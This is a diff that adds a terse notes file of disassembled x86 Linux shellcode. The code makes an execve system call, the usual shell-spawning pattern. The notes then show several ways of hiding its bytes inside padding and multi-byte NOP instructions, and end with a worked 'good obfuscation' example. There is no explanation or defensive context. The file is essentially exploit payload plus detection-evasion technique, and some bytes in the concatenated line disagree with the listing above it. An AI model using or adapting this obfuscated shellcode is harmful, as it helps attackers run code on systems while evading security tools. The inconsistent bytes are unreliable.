@@ -1,0 +1,54 @@
+Disassembled
+
+31 c0                	xor    %eax,%eax
+8d 35 a0 90 04 08    	lea    0x80490a0,%esi
+89 76 08             	mov    %esi,0x8(%esi)
+89 46 0c             	mov    %eax,0xc(%esi)
+b8 0b 00 00 00       	mov    $0xb,%eax
+8d 1e                	lea    (%esi),%ebx
+8d 4e 08             	lea    0x8(%esi),%ecx
+8d 56 0c             	lea    0xc(%esi),%edx
+cd 80                	int    $0x80
+
+31 c0                	
+				8d 35 a0 90 04 08    	
+89 76 08             	
+89 46 0c             	
+				b8 0b 00 00 00       	
+8d 1e                	
+8d 4e 08             	
+8d 56 0c             	
+cd 80 
+
+
+
+
+
+
+66 0f 40 84 31 c0 66 90 bf
+66 0f 90 84 89 76 08 90 bf 
+66 66 8d 84 89 46 0c 90 bf
+66 0f 90 84 8d 1e 66 90 bf
+66 0f 40 84 8d 4e 08 90 bf
+66 0f 40 84 8d 56 0c 90 bf
+66 0f 90 84 cd 80 66 66 90
+
+
+66 0f 40 84 31 c0 66 90 bf 66 0f 90 84 89 76 08 90 bf  66 66 8d 84 89 46 0c 90 bf 66 0f 90 48 8d 1e 66 90 bf 66 0f 40 84 8d 4e 08 90 bf 66 0f 1f 84 8d 56 0c 90 bf 66 0f 90 84 cd 89 66 66 90
+
+
+
+
+Good obfuscation without using 9 byte-instructions:
+
+31 c0 8d 35 a0 90 04 08:
+
+xor eax, eax
+lea esi, 0x080490a0
+
+becomes
+
+05 31 c0 90 8d 35 a0 90 04 08:
+add eax, 0x8d90c031
+xor eax, 0x080490a0
+
